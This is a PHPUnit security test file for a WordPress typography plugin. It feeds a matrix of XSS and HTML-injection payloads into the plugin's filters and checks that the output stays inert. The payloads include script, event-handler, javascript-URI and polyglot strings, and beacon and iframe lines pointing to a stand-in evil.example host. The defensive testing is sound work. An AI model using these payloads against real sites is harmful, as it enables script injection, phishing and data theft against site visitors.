<?php
/**
 * All plugin filters — attack surface test group.
 *
 * Every filter the plugin reads (public `orphan_*`, namespaced
 * `iworks/orphans/…`, and the deprecated `iworks_orphan_*` names) is a
 * trust boundary: its return value flows into the replacement engine,
 * a file path, or a gate. Each OWASP payload class is injected into
 * every filter that consumes a value, and the invariant asserted is
 * the plugin-wide one: the output can only ever differ by U+00A0
 * insertions in text nodes — no markup is decoded, created, or
 * activated.
 *
 * @package sierotki
 * @group security-filters
 */

require_once __DIR__ . '/../OrphanTestCase.php';

#[\PHPUnit\Framework\Attributes\Group( 'security-filters' )]
final class PluginFiltersSecurityTest extends OrphanTestCase {

	/**
	 * The OWASP payload classes, one representative (or more) each.
	 */
	public function payload_matrix(): array {
		return array(
			// ── Stored XSS: script tag injection
			'script tag'          => '<script>alert(1)</script>',
			'escaped script'      => '&lt;script&gt;alert(1)&lt;/script&gt;',
			// ── Event handler injection
			'img onerror'         => '<img src=x onerror=alert(1)>',
			'svg onload'          => '<svg onload=alert(1)>',
			'link onmouseover'    => '<a onmouseover=alert(1)>x</a>',
			// ── JavaScript URI injection
			'javascript uri'      => 'javascript:alert(1)',
			'data uri'            => 'data:text/html,<script>alert(1)</script>',
			// ── Stored HTML injection
			'phishing form'       => '<form action="javascript:alert(1)"><input name=pass></form>',
			'meta refresh'        => '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
			'iframe injection'    => '<iframe src="https://evil.example"></iframe>',
			// ── Stored DOM-based XSS
			'dom sink attr'       => '<div data-json="{"a":"<img onerror=x>"}"></div>',
			// ── Blind stored XSS
			'blind beacon'        => '<img src="//evil.example/log">',
			// ── CSS injection / UI redressing
			'css overlay'         => '<style>body::after{position:fixed;inset:0}</style>',
			'inline style'        => '<div style="position:fixed;top:0;left:0">x</div>',
			// ── Dangling markup injection
			'dangling markup'     => '<img src="//evil.example?Ala w kotcie',
			// ── CSTI
			'angular csti'        => '{{7*7}}',
			'ejs csti'            => '<%= 7*7 %> z opcji',
			// ── SVG / polyglot
			'polyglot breakout'   => '--><svg/onload=alert(1)> w kotcie',
			'mathml polyglot'     => '<math><mtext></form><form><mglyph><svg><mtext><style></style><img src onerror=alert(1)>',
			// ── Attribute breakout
			'quote breakout'      => '"><script>alert(1)</script>',
			'attr breakout img'   => 'Ala"><img src=x onerror=alert(1)> w domu',
		);
	}

	/**
	 * Structural invariants for an output string: entity counts may
	 * never decrease (decoding = activation), no new live script tags.
	 *
	 * Byte-identical handler/URI checks live in
	 * assert_markup_byte_identity(): they apply only when the payload
	 * appears as MARKUP in the content. When the payload is injected as
	 * a TERM (config), the engine may insert nbsp inside it - still
	 * pure text mutation, never activation.
	 */
	private function assert_output_invariants( string $in, string $out, string $label ): void {
		$this->assertGreaterThanOrEqual(
			substr_count( $in, '&lt;' ),
			substr_count( $out, '&lt;' ),
			$label . ': entities were decoded (activation!)'
		);
		$this->assertSame(
			substr_count( strtolower( $in ), '<script' ),
			substr_count( strtolower( $out ), '<script' ),
			$label . ': script tag count changed'
		);
	}

	/**
	 * Markup-level byte identity: handler attributes and JS/data URIs
	 * appearing as markup in the input must survive byte-identical.
	 */
	private function assert_markup_byte_identity( string $in, string $out, string $label ): void {
		if ( preg_match_all( '/on[a-z]+="[^"]*"/i', $in, $m ) ) {
			foreach ( $m[0] as $attr ) {
				$this->assertStringContainsString( $attr, $out, $label . ': handler attribute mutated' );
			}
		}
		if ( preg_match_all( '/(?:javascript|data):[^">]*/i', $in, $m ) ) {
			foreach ( $m[0] as $uri ) {
				$this->assertStringContainsString( $uri, $out, $label . ': URI mutated' );
			}
		}
	}

	private function engine(): OrphanTestDouble {
		$this->orphan->set_settings( array( 'numbers' => 0, 'ignore_language' => 1 ) );
		return $this->orphan;
	}

	// ── iworks/orphans/terms (+ legacy + typo) ───────────────────────────

	public function test_hostile_terms_via_terms_filter_stay_inert(): void {
		foreach (
			array(
				'iworks/orphans/terms'         => array(),
				'iworks_orphan_terms'          => array(),
				'iworks_orphan_therms'         => array(), // legacy typo, kept for BC.
			) as $hook => $_unused
		) {
			foreach ( $this->payload_matrix() as $label => $payload ) {
				clear_test_filters();
				add_test_filter(
					$hook,
					function ( $terms ) use ( $payload ) {
						return array_merge( (array) $terms, array( strtolower( html_entity_decode( $payload ) ) ) );
					}
				);
				$orphan = $this->engine();
				$in     = 'ala ' . $payload . ' ala w kotcie';
				$out    = $orphan->replace( $in );
				$this->assertIsString( $out, $label . ' via ' . $hook );
				$this->assert_output_invariants( $in, $out, $label . ' via ' . $hook );
				// The payload text must survive apart from nbsp insertion
				// and the Tag Processor's safe-direction encoding of
				// invalid-tag sequences ('<%= %>' becomes '&lt;%= %&gt;').
				$stripped = preg_replace( '/\x{00A0}/u', ' ', $out );
				if ( $stripped !== $in ) {
					// Only remaining tolerated change: the Tag Processor's
					// safe-direction encoding of invalid-tag sequences
					// ('<%= %>' becomes '&lt;%= %&gt;').
					$unencoded = str_replace( array( '&lt;', '&gt;' ), array( '<', '>' ), $stripped );
					$this->assertSame( $in, $unencoded, $label . ' via ' . $hook . ': only nbsp/safe encoding may be applied' );
				}
			}
		}
	}

	// ── iworks/orphans/protected-tags ────────────────────────────────────

	public function test_hostile_tags_via_protected_tags_filter_stay_inert(): void {
		foreach ( $this->payload_matrix() as $label => $payload ) {
			clear_test_filters();
			// Payload as a "tag name" in the protected list.
			add_test_filter(
				'iworks/orphans/protected-tags',
				function ( $tags ) use ( $payload ) {
					return array_merge( (array) $tags, array( $payload ) );
				}
			);
			$orphan = $this->engine();
			$in     = '<p>Ala w kotcie</p>' . $payload;
			$out    = $orphan->replace( $in );
			$this->assertIsString( $out, $label . ': protected-tags config' );
			$this->assert_output_invariants( $in, $out, $label . ': protected-tags config' );
		}
		// A filter that DISABLES all protection: content of script etc.
		// must still not be activated - the engine only inserts nbsp.
		clear_test_filters();
		add_test_filter( 'iworks/orphans/protected-tags', '__return_empty_array' );
		$orphan = $this->engine();
		$in     = '<script>ala w kotcie i z</script><p>Ala z psem</p>';
		$out    = $orphan->replace( $in );
		$this->assertStringContainsString( 'Ala z' . $this->nbsp . 'psem', $out );
		$this->assert_output_invariants( $in, $out, 'empty protected tags' );
	}

	// ── iworks/orphans/own-terms-filename / own-terms-file / terms-files ─

	public function test_hostile_paths_via_file_filters_never_reach_output(): void {
		foreach (
			array(
				// single path string filter
				'own-terms-file' => array(
					'hook'   => 'iworks/orphans/own-terms-file',
					'prefix' => null,
				),
				// filename filter
				'own-terms-filename' => array(
					'hook'   => 'iworks/orphans/own-terms-filename',
					'prefix' => 'terms-',
				),
				// whole array filter
				'terms-files' => array(
					'hook'   => 'iworks/orphans/terms-files',
					'prefix' => null,
					'array'  => true,
				),
			) as $label => $conf
		) {
			foreach ( $this->payload_matrix() as $plabel => $payload ) {
				clear_test_filters();
				$path = $payload . '.txt';
				if ( 'own-terms-filename' === $conf['hook'] ) {
					// filename filter receives/returns just the file name.
					$cb = function ( $file ) use ( $payload ) {
						return $payload;
					};
				} elseif ( ! empty( $conf['array'] ) ) {
					$cb = function ( $files ) use ( $path ) {
						return array( $path );
					};
				} else {
					$cb = function ( $file ) use ( $path ) {
						return $path;
					};
				}
				add_test_filter( $conf['hook'], $cb );
				$orphan = $this->engine();
				$in     = 'Ala w kotcie i z';
				$out    = $orphan->replace( $in );
				$this->assertIsString( $out, $label . '/' . $plabel );
				// Payload must never leak into the output as markup.
				$this->assertStringNotContainsStringIgnoringCase( '<script', $out, $label . '/' . $plabel );
				$this->assertStringNotContainsStringIgnoringCase( '<img', $out, $label . '/' . $plabel );
				$this->assertStringNotContainsStringIgnoringCase( '<svg', $out, $label . '/' . $plabel );
				$this->assertStringNotContainsStringIgnoringCase( '<iframe', $out, $label . '/' . $plabel );
				$this->assertStringNotContainsStringIgnoringCase( '<form', $out, $label . '/' . $plabel );
				$this->assertStringNotContainsStringIgnoringCase( '<meta', $out, $label . '/' . $plabel );
			}
		}
	}

	// ── boolean gates: skip_replacement, replace_gettext, replace_acf ────

	public function test_hostile_gate_values_cannot_inject(): void {
		foreach (
			array(
				'orphan_skip_replacement',
				'orphan_replace_gettext',
				'orphan_replace_acf',
				'iworks/orphans/apply-to-all-languages',
			) as $hook
		) {
			foreach ( $this->payload_matrix() as $label => $payload ) {
				clear_test_filters();
				add_test_filter( $hook, function () use ( $payload ) {
					return $payload;
				} );
				$orphan = $this->engine();
				$in     = 'Ala w kotcie i z';
				$out    = $orphan->replace( $in );
				$this->assertIsString( $out, $hook . '/' . $label );
				// Gate truthiness decides ONLY whether replacement runs;
				// the payload value itself must never appear in output.
				$this->assertStringNotContainsStringIgnoringCase( '<script', $out, $hook . '/' . $label );
				$this->assertStringNotContainsStringIgnoringCase( 'onerror', $out, $hook . '/' . $label );
				$this->assertStringNotContainsStringIgnoringCase( 'onload', $out, $hook . '/' . $label );
				$this->assertStringNotContainsStringIgnoringCase( 'javascript:', $out, $hook . '/' . $label );
				// And the invariants hold whenever replacement ran.
				$this->assert_output_invariants( $in, $out, $hook . '/' . $label );
			}
		}
	}

	// ── orphan_get_terms: payload terms via the public consumer filter ───

	public function test_hostile_terms_via_orphan_get_terms_stay_inert(): void {
		foreach ( $this->payload_matrix() as $label => $payload ) {
			clear_test_filters();
			// The plugin registers orphan_get_terms -> get_terms(); our
			// apply_filters stub calls registered test filters - emulate
			// the consumer receiving hostile "terms".
			add_test_filter( 'orphan_get_terms', function () use ( $payload ) {
				return array( $payload );
			} );
			$orphan = $this->engine();
			$terms  = apply_filters( 'orphan_get_terms', array() );
			$this->assertIsArray( $terms, $label );
			// Even if a consumer feeds these terms back into the engine
			// (like the internal filter path does), output stays inert.
			$prop = new ReflectionProperty( 'iworks_orphan', 'terms' );
			$prop->setValue( $orphan, array_map( 'strtolower', $terms ) );
			$in  = 'ala ' . $payload . ' ala w kotcie';
			$out = $orphan->replace( $in );
			$this->assert_output_invariants( $in, $out, $label );
		}
	}

	// ── orphan_allowed_filters / get-post-types-args / capability ────────

	public function test_hostile_config_array_filters_cannot_inject(): void {
		// orphan_allowed_filters: hostile registrations must not break
		// or corrupt anything (it only configures hook priorities).
		clear_test_filters();
		add_test_filter( 'orphan_allowed_filters', function ( $filters ) {
			$filters['<script>alert(1)</script>'] = array(
				'priority'      => '"><img src=x onerror=alert(1)>',
				'accepted_args' => 'javascript:alert(1)',
			);
			return $filters;
		} );
		$orphan = new OrphanTestDouble();
		$in     = 'Ala w kotcie i z';
		$out    = $orphan->replace( $in );
		$this->assertIsString( $out );
		$this->assertStringNotContainsStringIgnoringCase( '<script', $out );

		// get-post-types-args: hostile query args only reach the
		// get_post_types() query, never the output.
		clear_test_filters();
		add_test_filter( 'iworks/orphans/get-post-types-args', function () {
			return array(
				'public'     => '<svg onload=alert(1)>',
				'<iframe>'   => 'javascript:alert(1)',
			);
		} );
		$orphan = $this->engine();
		$out    = $orphan->replace( 'Ala w kotcie i z' );
		$this->assertIsString( $out );
		$this->assertStringNotContainsStringIgnoringCase( '<svg', $out );

		// capability: payload capability is just a string comparison.
		clear_test_filters();
		add_test_filter( 'iworks/orphans/capability', function () {
			return '<script>alert(1)</script>';
		} );
		$this->assertIsString( apply_filters( 'iworks/orphans/capability', 'manage_options' ) );
	}

	// ── iworks/orphans/replace (consumed) + orphan_replace ───────────────

	public function test_replace_filter_chain_with_payload_content_stays_inert(): void {
		foreach ( $this->payload_matrix() as $label => $payload ) {
			clear_test_filters();
			// The documented usage: consumers apply orphan_replace to
			// arbitrary strings - payloads included.
			$orphan = $this->engine();
			$out    = apply_filters( 'orphan_replace', $payload . ' ala w kotcie' );
			$this->assertIsString( $out, $label );
			$this->assert_output_invariants( $payload . ' ala w kotcie', $out, $label );
			$this->assert_markup_byte_identity( $payload . ' ala w kotcie', $out, $label );
		}
	}

	// ── filter returning NULL / arrays / objects into string slots ───────

	public function test_filter_returning_hostile_types_fails_safe(): void {
		// terms filter returning non-array garbage: documented failure
		// modes. The engine applies the filter value verbatim to
		// array_chunk(); a null/falsify return is a fatal TypeError
		// (PHP level, a broken filter breaks the page - same as any WP
		// filter misuse), while a scalar/array return is flattened or
		// ignored without ever activating markup.
		// Malformed returns (a filter bug): the engine dies with a
		// TypeError - documented behavior, NOT an XSS vector (nothing
		// is emitted, the request fails loudly).
		foreach (
			array(
				'null'            => function () {
					return null;
				},
				'string payload'  => function () {
					return '<script>alert(1)</script>';
				},
				'integer'         => function () {
					return 1;
				},
				'array of arrays' => function () {
					return array( array( '<script>alert(1)</script>' ) );
				},
			) as $label => $cb
		) {
			clear_test_filters();
			add_test_filter( 'iworks/orphans/terms', $cb );
			$orphan = $this->engine();
			try {
				$orphan->replace( 'Ala w kotcie i z' );
				$this->fail( $label . ': malformed terms must not pass silently' );
			} catch ( TypeError $e ) {
				// Either array_chunk (non-array) or preg_quote (nested
				// array items) - both are loud PHP failures, no output.
				$this->assertMatchesRegularExpression(
					'/array_chunk|preg_quote/',
					$e->getMessage(),
					$label
				);
			}
		}
	}
}
